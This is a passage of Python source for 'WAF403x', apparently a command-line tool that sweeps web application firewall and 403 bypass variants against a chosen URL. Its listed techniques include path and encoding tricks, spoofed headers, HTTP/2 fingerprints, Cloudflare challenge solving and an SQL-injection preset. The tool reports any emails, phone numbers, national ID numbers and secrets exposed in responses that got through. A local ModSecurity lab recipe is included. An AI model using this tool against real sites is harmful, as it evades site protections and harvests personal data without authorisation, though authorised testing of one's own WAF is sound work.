            line = candidate.strip()
            break
    if not line:
        err = (proc.stderr.strip().splitlines() or ["no JSON from solver"])[-1]
        return None, err
    try:
        data = json.loads(line)
    except ValueError as exc:
        return None, "bad solver JSON: %s" % exc
    if data.get("error"):
        return None, data["error"]
    return data, None


LAST_ERROR = ""


def _fail(message):
    """Record a fatal scan error for the CLI / JSON error object."""
    global LAST_ERROR
    LAST_ERROR = message
    sys.stderr.write("[x] %s\n" % message)
    return None, 2


def run(args):
    t = parse_url(args.url)
    if args.preset:
        payload = PRESETS[args.preset]
    elif args.payload is not None:
        payload = args.payload
    else:
        payload = DEFAULT_PAYLOAD

    if args.mode == "all":
        modes = ["path", "header", "method", "body", "encoding",
                 "cookie", "ctype", "size"]
        if args.http2 != "off":
            modes.append("h2")
    else:
        modes = [args.mode]
    if args.mode == "h2" and args.http2 == "off":
        return _fail("--mode h2 needs --http2 <profile>")

    timeout = max(0.5, float(args.timeout))
    threads = max(1, int(args.threads))
    delay = max(0.0, float(args.delay or 0.0))
    opts = {
        "http2": args.http2,
        "follow": max(0, int(args.follow)),
        "max_body": max(4096, int(args.max_body)),
        "ciphers": args.ciphers or None,
        "tls_min": args.tls_min,
        "tls_max": args.tls_max,
        "alpn": [args.alpn] if args.alpn else None,
    }
    jar = {} if args.cookies else None
    jar_lock = threading.Lock()
    challenge = None
    if args.solve_challenge:
        solver_py = args.solver_python
        if not solver_py:
            local_py = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    ".venv", "bin", "python")
            solver_py = local_py if os.path.exists(local_py) else sys.executable
        solved, err = solve_challenge(args.url, solver_py, args.solver_timeout,
                                      args.solver_refresh)
        if solved is None:
            return _fail("challenge solver failed: %s" % err)
        opts["ua"] = solved.get("user_agent") or UA_DEFAULT
        jar = dict(solved.get("cookies") or {})
        challenge = {
            "status": solved.get("status"),
            "title": solved.get("title"),
            "cookies": len(jar),
            "user_agent": opts["ua"],
            "challenge_page": solved.get("challenge"),
        }

    # Baseline = the un-obfuscated attack against the same endpoint, so a
    # 2xx baseline means nothing is blocked and no bypass can be proven.
    # Body-shaped modes use the canonical urlencoded POST; cookie mode uses
    # the plain cookie; payload-in-query modes inject the raw payload;
    # other modes use the URL as given.
    if args.mode in ("body", "ctype", "size"):
        base_v = mk("base", "baseline", "POST", t.target,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=("%s=%s" % (args.param, quote(payload, safe=""))).encode("latin-1"))
    elif args.mode == "cookie":
        base_v = mk("base", "baseline", "GET", t.target,
                    headers={"Cookie": "q=" + payload})
    elif args.mode in ("encoding", "all"):
        base_q = inject_query(t.query, args.param,
                              quote(payload, safe="!$&'()*+,-./:;=?@_~"))
        base_v = mk("base", "baseline", "GET", t.path + "?" + base_q)
    else:
        base_v = mk("base", "baseline", "GET", t.target)

    base = fetch(t, base_v, timeout, 0.0, opts, jar, jar_lock)
    if base.status == 0:
        return _fail("baseline failed: %s" % (base.error or "no response"))

    ctrl_path = "/" + "".join(random.choice(string.ascii_lowercase + string.digits)
                              for _ in range(12))
    ctrl = fetch(t, mk("ctrl", "control", "GET", ctrl_path), timeout, 0.0,
                 opts, jar, jar_lock)

    variants = build_variants(t, modes, args.param, payload, args.profile,
                              args.level)
    if not variants:
        return _fail("no variants generated")

    results = [None] * len(variants)

    def work(idx_v):
        idx, v = idx_v
        resp = fetch(t, v, timeout, delay, opts, jar, jar_lock)
        results[idx] = (v, resp)

    with ThreadPoolExecutor(max_workers=threads) as pool:
        list(pool.map(work, list(enumerate(variants))))

    rows = []
    for v, resp in results:
        verdict = classify(resp, base, ctrl)
        rows.append({
            "variant": v["name"],
            "mode": v["mode"],
            "method": getattr(resp, "final_method", v["method"]),
            "status": resp.status,
            "bytes": resp.length,
            "verdict": verdict,
            "snippet": snippet(resp),
            "impact": None,
            "finding": finding(resp) if verdict == "BYPASS" else None,
            "error": resp.error,
            "retries": 0,
            "stable": None,
        })

    # size differential: only call it a bypass when the offset-0 control is
    # blocked and the same body with the payload past the window is served.
    pairs = {}
    for i, v in enumerate(variants):
        if "pair" in v:
            pairs.setdefault(v["pair"], {})[v["role"]] = i
    for d in pairs.values():
        pi = d.get("padded")
        ci = d.get("ctl")
        if pi is None or ci is None:
            continue
        if (not (200 <= base.status < 400)
                and rows[ci]["verdict"] == "BLOCKED"
                and 200 <= rows[pi]["status"] < 400 and rows[pi]["bytes"] > 0
                and results[pi][1].body != results[ci][1].body):
            rows[pi]["verdict"] = "BYPASS"

    # Impact oracle: replay every BYPASS with a harmless payload through the
    # same transform. Identical response means the transform itself slipped
    # past the WAF (access), a different response means the payload changed
    # app behaviour (payload).
    impact = {"payload": 0, "access": 0, "unknown": 0}
    if args.impact:
        for i, row in enumerate(rows):
            row["impact"] = None
            if row["verdict"] != "BYPASS":
                continue
            twin = twin_variant(variants[i], t, args.param, args.profile)
            if twin is None:
                row["impact"] = "unknown"
            else:
                tr = fetch(t, twin, timeout, delay, opts, jar, jar_lock)
                orig = results[i][1]
                if tr.status != orig.status or tr.body != orig.body:
                    row["impact"] = "payload"
                else:
                    row["impact"] = "access"
            impact[row["impact"]] += 1

    for i, row in enumerate(rows):
        if row["verdict"] == "BYPASS" and row.get("finding") is None:
            row["finding"] = finding(results[i][1])

    # stability gate: identical bytes, fresh connection, sequential so the
    # comparison is not perturbed by concurrent retries of other candidates.
    repeat = max(0, int(args.repeat))
    candidates = [i for i, r in enumerate(rows) if r["verdict"] in ("BYPASS", "DIFF")]
    confirmed = 0
    for idx in candidates:
        r0 = results[idx][1]
        h0 = hashlib.sha256(r0.body).digest()
        stable = True
        sent = 0
        for _ in range(repeat):
            r2 = fetch(t, variants[idx], timeout, delay, opts, jar, jar_lock)
            sent += 1
            if r2.status != r0.status or hashlib.sha256(r2.body).digest() != h0:
                stable = False
                break
        rows[idx]["stable"] = stable
        rows[idx]["retries"] = sent
        if stable:
            confirmed += 1
        else:
            rows[idx]["verdict"] = "UNSTABLE"
            rows[idx]["finding"] = None

    # A size row is evidence only when its own offset-0 control was blocked;
    # after the stability gate that control may have been demoted, so enforce
    # the invariant on the final verdicts. When the control is not BLOCKED the
    # pair proves nothing (the host simply served the payload), so neither half
    # may stay BYPASS.
    for d in pairs.values():
        pi, ci = d.get("padded"), d.get("ctl")
        if pi is None or ci is None:
            continue
        if rows[ci]["verdict"] != "BLOCKED":
            for i in (pi, ci):
                if rows[i]["verdict"] == "BYPASS":
                    rows[i]["verdict"] = "DIFF"
                    rows[i]["finding"] = None

    # The oracle ran before the stability gate; only rows that survived that
    # gate are still BYPASS, so the summary must not count demoted ones.
    if args.impact:
        impact = {"payload": 0, "access": 0, "unknown": 0}
        for row in rows:
            if row["verdict"] == "BYPASS" and row.get("impact"):
                impact[row["impact"]] += 1

    counts = {"BYPASS": 0, "BLOCKED": 0, "NOTFOUND": 0, "DIFF": 0,
              "ERROR": 0, "UNSTABLE": 0, "CHALLENGE": 0}
    for r in rows:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1

    # A control page that looks like the baseline means the soft-404 has the
    # same shape as the app, so body similarity cannot separate a bypass from
    # ordinary routing.
    masked = (base.status != 0 and base.status == ctrl.status
              and similarity(base.text(), ctrl.text()) >= 0.90)

    summary = {"variants": len(rows), "repeat": repeat, "masked": masked,
               "impact": impact if args.impact else None,
               "stability": {"retried": len(candidates), "confirmed": confirmed}}
    summary.update(counts)
    data = {
        "ok": True,
        "url": args.url,
        "mode": args.mode,
        "level": args.level,
        "param": args.param,
        "profile": args.profile,
        "http2": args.http2,
        "follow": opts["follow"],
        "cookies": jar is not None,
        "max_body": opts["max_body"],
        "challenge": challenge,
        "payload": payload,
        "baseline": {"method": getattr(base, "final_method", base_v["method"]),
                     "target": base_v["target"],
                     "status": base.status, "bytes": base.length,
                     "challenge": challenge_kind(base),
                     "snippet": snippet(base), "blocked": not 200 <= base.status < 400},
        "control": {"status": ctrl.status, "bytes": ctrl.length,
                    "error": ctrl.error, "snippet": snippet(ctrl)},
        "rows": rows,
        "summary": summary,
    }
    ok = counts["BYPASS"] > 0 and not (200 <= base.status < 400)
    return data, (0 if ok else 1)


def term_width(default=100):
    try:
        return max(40, shutil.get_terminal_size((default, 24)).columns)
    except OSError:
        return default


def fit(text, width):
    text = " ".join(str(text).split())
    if width <= 3 or len(text) <= width:
        return text[:max(0, width)]
    return text[:width - 3] + "..."


def emit(out, line, width):
    for i, part in enumerate(textwrap.wrap(line, width=max(20, width)) or [""]):
        out.append(part if i == 0 else "  " + part)


def render_rows(rows, width):
    out = []
    if width < 78:
        hdr = "MODE/VARIANT          METHOD STATUS BYTES VERDICT"
        if len(hdr) > width:
            out.append(fit("MODE/VARIANT", width))
            hdr = "METHOD STATUS BYTES VERDICT"
        out.append(hdr)
        out.append("-" * min(width, 64))
        for r in rows:
            out.append(fit("%s/%s  %s %s %s %s"
                           % (r["mode"], r["variant"], r["method"],
                              r["status"], r["bytes"], r["verdict"]), width))
            if r["snippet"]:
                for line in textwrap.wrap('"%s"' % r["snippet"],
                                          width=max(20, width - 2))[:2]:
                    out.append("  " + line)
        return out
    vw = min(28, max(10, width - 62))
    snap_w = max(12, width - (43 + vw))
    out.append("%-9s %-*s %-6s %-6s %-7s %-9s %s"
               % ("MODE", vw, "VARIANT", "METHOD", "STATUS", "BYTES",
                  "VERDICT", "SNIPPET"))
    out.append("-" * min(width, 43 + vw + snap_w))
    for r in rows:
        out.append("%-9s %-*s %-6s %-6s %-7s %-9s %s"
                   % (r["mode"], vw, fit(r["variant"], vw), r["method"],
                      r["status"], r["bytes"], r["verdict"],
                      fit(r["snippet"], snap_w)))
    return out


def _list(values, limit=3):
    shown = ", ".join(values[:limit])
    if len(values) > limit:
        shown += ", +%d more" % (len(values) - limit)
    return shown


def render_findings(findings, baseline_status, width):
    groups = []
    index = {}
    for row in findings:
        f = row["finding"]
        key = (f["severity"], f["title"], tuple(f["emails_list"]),
               tuple(f["phones_list"]), tuple(f["niks_list"]),
               tuple(f["sensitive"]), f["snippet"])
        if key not in index:
            index[key] = []
            groups.append((key, index[key]))
        index[key].append(row)
    statuses = ",".join(sorted(set(str(r["status"]) for r in findings)))
    out = ["[+] FINDINGS (baseline %s -> bypass %s)"
           % (baseline_status, statuses)]
    for key, rows in groups:
        severity, title, emails, phones, niks, sensitive, excerpt = key
        names = ["%s/%s" % (r["mode"], r["variant"]) for r in rows]
        shown = ", ".join(names[:6])
        if len(names) > 6:
            shown += ", +%d more" % (len(names) - 6)
        head = "  severity=%s title=%r variants=%d" % (severity, title,
                                                       len(rows))
        emit(out, head, width)
        emit(out, "    variants: " + shown, width)
        if emails:
            emit(out, "    emails  : %s" % _list(emails), width)
        if phones:
            emit(out, "    phones  : %s" % _list(phones), width)
        if niks:
            emit(out, "    niks    : %s" % _list(niks), width)
        if sensitive:
            emit(out, "    secrets : %s" % ", ".join(sensitive), width)
        if excerpt and (emails or phones or niks or sensitive):
            for line in textwrap.wrap('excerpt: "%s"' % excerpt,
                                      width=max(20, width - 4))[:2]:
                out.append("    " + line)
        elif severity == "low":
            emit(out, "    no PII or secrets in the response", width)
    return out


def render(data, as_json, width=None):
    if as_json:
        return json.dumps(data, indent=2, ensure_ascii=False)
    width = width or term_width()
    out = []
    emit(out, "[*] target   %s   mode=%s   level=%d   param=%s   profile=%s"
         % (data["url"], data["mode"], data["level"], data["param"],
            data["profile"]), width)
    if data["http2"] != "off":
        emit(out, "[*] transport h2 (ALPN h2) profile=%s follow=%d cookies=%s"
             % (data["http2"], data["follow"], data["cookies"]), width)
    elif data["follow"] or data["cookies"]:
        emit(out, "[*] transport h1 follow=%d cookies=%s"
             % (data["follow"], data["cookies"]), width)
    if data.get("challenge"):
        ch = data["challenge"]
        emit(out, "[*] challenge solver cookies=%d status=%s title=%r solved=%s"
             % (ch["cookies"], ch["status"], ch["title"],
                not ch["challenge_page"]), width)
    emit(out, "[*] payload  %s" % data["payload"], width)
    emit(out, '[*] baseline %s %s -> %s / %d bytes  "%s"'
         % (data["baseline"]["method"], data["baseline"]["target"],
            data["baseline"]["status"], data["baseline"]["bytes"],
            data["baseline"]["snippet"]), width)
    if not data["baseline"]["blocked"]:
        emit(out, "[i] baseline already returns 2xx/3xx (nothing is being "
             "blocked); BYPASS rows cannot be proven against it", width)
    if data["baseline"].get("challenge"):
        emit(out, "[!] baseline is a JS/CAPTCHA challenge (%s); rerun with "
             "--solve-challenge to mint cookies in a browser"
             % data["baseline"]["challenge"], width)
    emit(out, '[*] control  GET -> %s / %d bytes  "%s"'
         % (data["control"]["status"], data["control"]["bytes"],
            data["control"]["snippet"]), width)
    if data["control"]["status"] == 0:
        emit(out, "[!] control failed (%s); NOTFOUND rows are unreliable and "
             "soft-404 masking cannot be judged"
             % (data["control"].get("error") or "no response"), width)
    if data["summary"]["masked"]:
        emit(out, "[!] soft-404 masking: control and baseline share status "
             "and body; DIFF rows are not evidence", width)
    out.append("")
    out.extend(render_rows(data["rows"], width))
    out.append("")
    s = data["summary"]
    st = s["stability"]
    emit(out, "[+] SUMMARY variants=%d bypass=%d blocked=%d notfound=%d "
         "diff=%d error=%d unstable=%d challenge=%d"
         % (s["variants"], s["BYPASS"], s["BLOCKED"], s["NOTFOUND"],
            s["DIFF"], s["ERROR"], s["UNSTABLE"], s["CHALLENGE"]), width)
    if s["repeat"]:
        out.append("[i] stability: %d/%d confirmed"
                   % (st["confirmed"], st["retried"]))
    else:
        out.append("[i] stability: disabled (--repeat 0)")
    if s.get("impact"):
        imp = s["impact"]
        emit(out, "[i] impact: payload=%d access=%d unknown=%d "
             "(access = transform slipped through, app response unchanged)"
             % (imp["payload"], imp["access"], imp["unknown"]), width)
    byp = [r for r in data["rows"] if r["verdict"] == "BYPASS"]
    if byp:
        emit(out, "[+] BYPASS rows: " + ", ".join(
            "%s/%s(%d)" % (r["mode"], r["variant"], r["status"]) for r in byp),
            width)
    else:
        out.append("[+] BYPASS rows: none")
    uns = [r for r in data["rows"] if r["verdict"] == "UNSTABLE"]
    if uns:
        emit(out, "[!] UNSTABLE rows: " + ", ".join(
            "%s/%s(%d)" % (r["mode"], r["variant"], r["status"]) for r in uns),
            width)
    findings = [r for r in data["rows"]
                if r.get("finding") and r["verdict"] == "BYPASS"]
    if findings:
        out.append("")
        out.extend(render_findings(findings, data["baseline"]["status"], width))
    return "\n".join(out)


MODE_CHOICES = ["path", "header", "method", "body", "encoding", "cookie",
                "ctype", "size", "h2", "all"]

LEVEL_HELP = (
    "  level 1 = obvious rewrite: //, /./, trailing slash, case toggle,\n"
    "            loopback X-Forwarded-For, Googlebot UA, GET/HEAD/OPTIONS\n"
    "  level 2 = one parser differential: %2e, backslash, ..;/, trailing dot,\n"
    "            url + double-url payload, X-Original-URL, method override, JSON body\n"
    "  level 3 = double layer: %252e, %uXXXX, hex, MySQL comments, HPP,\n"
    "            multipart, duplicate cookie\n"
    "  level 4 = null/terminal framing: %00, %00.png, base64, HTML entity,\n"
    "            phantom-octal cookie, chunked body, vendor size windows"
)


def _resize_hook(callback):
    if not hasattr(signal, "SIGWINCH"):
        return
    def handler(signum, frame):
        sys.stdout.write("\n")
        callback()
        sys.stdout.flush()
    try:
        signal.signal(signal.SIGWINCH, handler)
    except (ValueError, OSError):
        pass


def repl(args):
    last = None
    print(BANNER.strip())
    print("interactive mode. commands: run | url <u> | mode <m> | level <1-4> |")
    print("  preset <p> | payload <text> | http2 <profile> | follow <n> |")
    print("  repeat <n> | threads <n> | json on|off | impact on|off | quit\n")

    def redraw():
        if last is not None:
            print(render(last, args.json, term_width()))
            print("waf403x> ", end="")

    _resize_hook(redraw)
    while True:
        try:
            line = input("waf403x> ").strip()
        except EOFError:
            print()
            return 0
        except KeyboardInterrupt:
            print()
            return 0
        if not line:
            continue
        parts = line.split()
        cmd = parts[0].lower()
        arg = line.split(None, 1)[1].strip() if len(parts) > 1 else ""
        try:
            if cmd in ("quit", "exit", "q"):
                return 0
            if cmd == "run":
                data, code = run(args)
                if data is None:
                    print("[x] run failed (exit %d)" % code)
                else:
                    last = data
                    print(render(data, args.json, term_width()))
                    if args.json:
                        print()
            elif cmd == "url" and arg:
                args.url = arg
                print("url =", arg)
            elif cmd == "mode" and arg in MODE_CHOICES:
                args.mode = arg
                print("mode =", arg)
            elif cmd == "level" and arg in ("1", "2", "3", "4"):
                args.level = int(arg)
                print("level =", arg)
            elif cmd == "levels":
                print(LEVEL_HELP)
            elif cmd == "preset" and arg in PRESETS:
                args.preset = arg
                print("preset =", arg)
            elif cmd == "payload" and arg:
                args.payload = arg
                print("payload =", arg)
            elif cmd == "http2" and arg in h2.PROFILES:
                args.http2 = arg
                print("http2 =", arg)
            elif cmd == "follow" and arg.isdigit():
                args.follow = int(arg)
                print("follow =", arg)
            elif cmd == "repeat" and arg.isdigit():
                args.repeat = int(arg)
                print("repeat =", arg)
            elif cmd == "threads" and arg.isdigit():
                args.threads = int(arg)
                print("threads =", arg)
            elif cmd == "json" and arg in ("on", "off"):
                args.json = arg == "on"
                print("json =", arg)
            elif cmd == "impact" and arg in ("on", "off"):
                args.impact = arg == "on"
                print("impact =", arg)
            elif cmd == "help":
                print("run, url, mode, level, levels, preset, payload, http2, follow, "
                      "repeat, threads, json, impact, quit")
            else:
                print("unknown command or bad value; type help")
        except ValueError as exc:
            print("[x] %s" % exc)


def watch(args, interval):
    last = None
    active = _alt_enter()

    def show():
        if last is not None:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.write("[i] watch every %ds, Ctrl-C to stop\n\n"
                             % interval)
            sys.stdout.write(render(last, args.json, term_width()) + "\n")
            sys.stdout.flush()

    _resize_hook(show)
    try:
        while True:
            data, code = run(args)
            if data is not None:
                last = data
                show()
            time.sleep(max(1, interval))
    except KeyboardInterrupt:
        return 0
    finally:
        _alt_leave(active)


def _ask(prompt, default=""):
    suffix = " [%s]" % default if default else ""
    try:
        value = input("%s%s: " % (prompt, suffix)).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    return value or default


def _print_banner():
    width = term_width()
    lines = BANNER.strip("\n").splitlines()
    if width >= max(len(line) for line in lines) + 2:
        for line in lines:
            print(line.center(width))
    else:
        print("WAF403x".center(width))
    print(("stdlib 403/WAF sweep engine  v%s" % VERSION).center(width))
    print(("raw HTTP/1.1 + h2/HPACK | impact oracle | findings").center(width))
    print()


MENU_OPTIONS = [
    ("1", "Scan URL (path/header/encoding sweep)"),
    ("2", "HTTP/2 fingerprint scan"),
    ("3", "Solve JS/CAPTCHA challenge, then scan"),
    ("4", "Watch mode (repeat on interval, Ctrl-C to stop)"),
    ("5", "Interactive shell (type commands, stays alive)"),
    ("6", "Real WAF lab (ModSecurity CRS via podman)"),
    ("7", "Help / examples"),
    ("0", "Exit"),
]


def _menu_lines(width, height):
    lines = []
    banner = BANNER.strip("\n").splitlines()
    if width >= 70 and height >= len(banner) + len(MENU_OPTIONS) + 8:
        for line in banner:
            lines.append(line.center(width))
        lines.append(("stdlib 403/WAF sweep engine  v%s" % VERSION).center(width))
        lines.append(("raw HTTP/1.1 + h2/HPACK | impact oracle | findings")
                     .center(width))
        lines.append("")
    else:
        lines.append(("WAF403x v%s" % VERSION).center(width))
        lines.append("")
    lines.append("  MENU")
    for key, label in MENU_OPTIONS:
        for wrapped in textwrap.wrap("  %s) %s" % (key, label),
                                      width=max(24, width - 2)):
            lines.append(wrapped)
    lines.append("")
    return lines[:max(8, height - 2)]


def _alt_enter(wipe=False):
    """Switch to the alternate screen so the menu never enters scrollback.

    wipe=True also erases scrollback, used only for the first entry so reports
    printed in the normal buffer stay scrollable.
    """
    if not sys.stdout.isatty():
        return False
    sys.stdout.write("\033[?1049h\033[2J" + ("\033[3J" if wipe else "") + "\033[H")
    sys.stdout.flush()
    return True


def _alt_leave(active):
    if active:
        sys.stdout.write("\033[2J\033[H\033[?1049l")
        sys.stdout.flush()


def _draw_menu():
    width, height = shutil.get_terminal_size((100, 30))
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.write("\n".join(_menu_lines(width, height)) + "\n")
    sys.stdout.flush()


def _menu_action(choice, args):
    if choice == "1":
        url = _ask("target URL", args.url or "")
        if not url:
            print("[x] empty URL")
            return True
        args.url = url
        args.mode = _ask("mode (path/header/method/body/encoding/cookie/"
                         "ctype/size/all)", args.mode)
        if args.mode not in MODE_CHOICES:
            print("[x] unknown mode")
            return True
        print(LEVEL_HELP)
        lvl = _ask("level 1-4 (see above)", str(args.level))
        args.level = int(lvl) if lvl in ("1", "2", "3", "4") else 4
        rep = _ask("repeat", str(args.repeat))
        args.repeat = int(rep) if rep.isdigit() else 2
        data, code = run(args)
        if data:
            print()
            print(render(data, args.json, term_width()))
        else:
            print("[x] run failed (exit %d)" % code)
        return True
    if choice == "2":
        url = _ask("target URL")
        if not url:
            print("[x] empty URL")
            return True
        args.url = url
        args.mode = "h2"
        args.http2 = _ask("h2 profile (chrome/firefox/safari/nghttp2/plain)",
                          "chrome")
        if args.http2 not in h2.PROFILES:
            args.http2 = "chrome"
        data, code = run(args)
        if data:
            print()
            print(render(data, args.json, term_width()))
        else:
            print("[x] run failed (exit %d)" % code)
        return True
    if choice == "3":
        url = _ask("target URL")
        if not url:
            print("[x] empty URL")
            return True
        args.url = url
        args.solve_challenge = True
        args.cookies = True
        args.follow = 2
        print("[i] solving in a browser, 2-5 minutes; cookie cache TTL 900 s...")
        data, code = run(args)
        if data:
            print()
            print(render(data, args.json, term_width()))
        else:
            print("[x] run failed (exit %d)" % code)
        return True
    if choice == "4":
        url = _ask("target URL")
        if not url:
            print("[x] empty URL")
            return True
        args.url = url
        interval = _ask("interval seconds", "60")
        watch(args, int(interval) if interval.isdigit() else 60)
        return True
    if choice == "5":
        repl(args)
        return True
    if choice == "6":
        print()
        print("  CRS lab steps (macOS/podman):")
        print("    podman machine start")
        print("    printf 'SecRule REQUEST_URI \"@beginsWith /users\" "
              "\"id:900001,phase:1,deny,status:403,log\"\\n' > "
              "~/wafbypass-crs.conf")
        print("    python3 tests/sim_waf.py --host 0.0.0.0 &")
        print("    podman run -d --name crs -p 8080:8080 -v "
              "\"$HOME/wafbypass-crs.conf:/etc/modsecurity.d/zz-custom.conf:ro\" \\")
        print("      -e BACKEND=http://host.containers.internal:8099 "
              "-e PORT=8080 -e MODSEC_RULE_ENGINE=on \\")
        print("      -e PARANOIA=1 -e BLOCKING_PARANOIA=1 "
              "owasp/modsecurity-crs:nginx")
        print("    python3 wafbypass.py -u http://127.0.0.1:8080/users "
              "--mode path --level 2 -t 2 --repeat 2")
        print()
        return True
    if choice == "7":
        print()
        print("  Examples:")
        print("    wafbypass.py -u https://t/users --mode path --level 2")
        print("    wafbypass.py -u 'https://t/search?q=1' --preset sqli "
              "--mode encoding")
        print("    wafbypass.py -u https://t/ --http2 chrome --mode h2")
        print("    wafbypass.py -u https://t/ --solve-challenge --follow 2")
        print("    wafbypass.py -u https://t/ --watch 60")
        print("    wafbypass.py -i          # interactive shell")
        print("    wafbypass.py --help")
        print()
        return True
    print("[x] no such option")
    return True


def welcome_menu(args):
    full = _alt_enter(wipe=True)
    if full:
        def on_resize(signum, frame):
            _draw_menu()
            sys.stdout.write("select menu [1]: ")
            sys.stdout.flush()

        try:
            signal.signal(signal.SIGWINCH, on_resize)
        except (ValueError, OSError):
            pass
    printed = False
    try:
        while True:
            if full:
                _draw_menu()
            elif not printed:
                _print_banner()
                for key, label in MENU_OPTIONS:
                    print("  %s) %s" % (key, label))
                print()
                printed = True
            choice = _ask("select menu", "1")
            if choice is None or choice == "0":
                print("bye.")
                return 0
            if full:
                _alt_leave(True)
            _menu_action(choice, args)
            if full:
                _ask("Enter to return to menu")
                _alt_enter()
    finally:
        _alt_leave(full)


def fatal_document(message, code, args=None):
    """Fatal JSON document: same top-level fields as a normal one, ok=false."""
    def opt(name, default=None):
        return getattr(args, name, default) if args is not None else default
    return {
        "ok": False,
        "fatal": True,
        "error": message,
        "exit": code,
        "url": opt("url"),
        "mode": opt("mode"),
        "level": opt("level"),
        "param": opt("param"),
        "profile": opt("profile"),
        "http2": opt("http2"),
        "follow": opt("follow", 0) or 0,
        "cookies": bool(opt("cookies", False)),
        "max_body": opt("max_body"),
        "challenge": None,
        "payload": opt("payload"),
        "baseline": None,
        "control": None,
        "rows": [],
        "summary": None,
    }


class JsonArgumentParser(argparse.ArgumentParser):
    """argparse that mirrors a fatal CLI error to stdout when --json is set."""

    def __init__(self, *args, **kwargs):
        self.json_argv = kwargs.pop("json_argv", [])
        super().__init__(*args, **kwargs)

    def error(self, message):
        if "--json" in self.json_argv:
            sys.stdout.write(json.dumps(fatal_document(message, 2)) + "\n")
            sys.stdout.flush()
        super().error(message)


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)
    ap = JsonArgumentParser(
        description="403/WAF bypass sweep engine (raw socket request-target)",
        json_argv=argv)
    ap.add_argument("-u", "--url", default=None, help="target URL")
    ap.add_argument("-V", "--version", action="store_true",
                    help="print banner and version")
    ap.add_argument("--banner", action="store_true", help="print banner")
    ap.add_argument("--mode", default="all",
                    choices=["path", "header", "method", "body", "encoding",
                             "cookie", "ctype", "size", "h2", "all"],
                    help="variant family to sweep (default: all)")
    ap.add_argument("--profile", default="generic", choices=sorted(PROFILE_LIMITS),
                    help="vendor profile selecting the size-family limits")
    ap.add_argument("--http2", default="off",
                    choices=["off", "chrome", "firefox", "safari", "nghttp2",
                             "plain"],
                    help="send every request over h2 with this client "
                         "fingerprint profile (default: off)")
    ap.add_argument("--follow", type=int, default=0, metavar="N",
                    help="follow up to N same-host redirects (default 0)")
    ap.add_argument("--cookies", action="store_true",
                    help="keep a Set-Cookie jar for the whole run")
    ap.add_argument("--solve-challenge", action="store_true",
                    help="mint Cloudflare cookies with challenge.py in the "
                         "solver venv, then reuse them for raw requests")
    ap.add_argument("--solver-python", default=None,
                    help="interpreter with scrapling installed (default: "
                         "./.venv/bin/python when present)")
    ap.add_argument("--solver-timeout", type=float, default=120.0,
                    help="challenge solver timeout seconds (default 120)")
    ap.add_argument("--solver-refresh", action="store_true",
                    help="ignore the cached cf_clearance and solve again")
    ap.add_argument("--max-body", type=int, default=MAX_BODY, metavar="BYTES",
                    help="response body cap in bytes (default %d)" % MAX_BODY)
    ap.add_argument("--ciphers", default=None,
                    help="OpenSSL cipher list, e.g. AES128-SHA:AES256-SHA")
    ap.add_argument("--tls-min", default=None,
                    choices=["TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"],
                    help="minimum TLS version")
    ap.add_argument("--tls-max", default=None,
                    choices=["TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"],
                    help="maximum TLS version")
    ap.add_argument("--alpn", default=None, choices=["http/1.1", "h2"],
                    help="ALPN protocol for h1 transport (h2 mode forces h2)")
    ap.add_argument("--level", type=int, default=4, choices=[1, 2, 3, 4],
                    help="escalation level: 1 obvious, 2 single differential, "
                         "3 double layer, 4 null framing/size windows (default 4)")
    ap.add_argument("--no-impact", dest="impact", action="store_false",
                    help="skip the benign-twin impact oracle for BYPASS rows")
    ap.add_argument("--repeat", type=int, default=2,
                    help="stability re-sends per BYPASS/DIFF candidate (default 2)")
    ap.add_argument("--param", default="q", help="query parameter to inject (default: q)")
    ap.add_argument("--payload", default=None, help="payload string")
    ap.add_argument("--preset", default=None, choices=sorted(PRESETS),
                    help="named payload preset")
    ap.add_argument("-t", "--threads", type=int, default=8, help="worker threads (default 8)")
    ap.add_argument("--timeout", type=float, default=10.0, help="per-request timeout seconds")
    ap.add_argument("--delay", type=float, default=0.0, help="delay between requests (seconds)")
    ap.add_argument("--json", action="store_true", help="emit JSON")
    ap.add_argument("-o", "--out", default=None, help="write output to file")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="interactive shell, stays alive between runs")
    ap.add_argument("--watch", type=int, default=0, metavar="SECONDS",
                    help="re-run the same scan every N seconds (Ctrl-C stops)")
    ap.add_argument("--menu", action="store_true",
                    help="open the welcome menu")
    args = ap.parse_args(argv)
    tls_order = {"TLSv1": 0, "TLSv1_1": 1, "TLSv1_2": 2, "TLSv1_3": 3}
    if (args.tls_min and args.tls_max
            and tls_order[args.tls_min] > tls_order[args.tls_max]):
        ap.error("--tls-min %s is above --tls-max %s"
                 % (args.tls_min, args.tls_max))
    if args.banner or args.version:
        sys.stdout.write(BANNER.lstrip("\n") + "\n")
        if args.version:
            sys.stdout.write("WAF403x %s\n" % VERSION)
        return 0
    if args.interactive:
        return repl(args)
    if args.watch:
        if not args.url:
            ap.error("-u/--url is required with --watch")
        return watch(args, args.watch)
    if args.menu or not args.url:
        return welcome_menu(args)

    try:
        data, code = run(args)
    except ValueError as exc:
        sys.stderr.write("[x] %s\n" % exc)
        if args.json:
            sys.stdout.write(json.dumps(fatal_document(str(exc), 2, args)) + "\n")
        return 2
    except KeyboardInterrupt:
        sys.stderr.write("[x] interrupted\n")
        if args.json:
            sys.stdout.write(json.dumps(fatal_document("interrupted", 2, args))
                             + "\n")
        return 2
    if data is None:
        if args.json:
            sys.stdout.write(json.dumps(
                fatal_document(LAST_ERROR or "scan failed", code, args)) + "\n")
        return code

    text = render(data, args.json, term_width())
    sys.stdout.write(text + "\n")
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    return code


if __name__ == "__main__":
    sys.exit(main())
